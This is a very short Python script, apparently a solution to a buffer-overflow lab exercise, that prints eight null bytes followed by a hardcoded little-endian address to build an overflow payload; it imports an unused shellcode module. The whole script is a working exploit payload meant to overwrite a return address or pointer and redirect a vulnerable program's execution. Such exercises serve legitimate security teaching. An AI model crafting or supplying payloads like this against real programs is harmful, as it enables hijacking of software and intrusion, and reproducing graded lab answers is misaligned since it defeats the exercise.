#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b'\x00'*8 + b'\xbc\x88\x04\x08')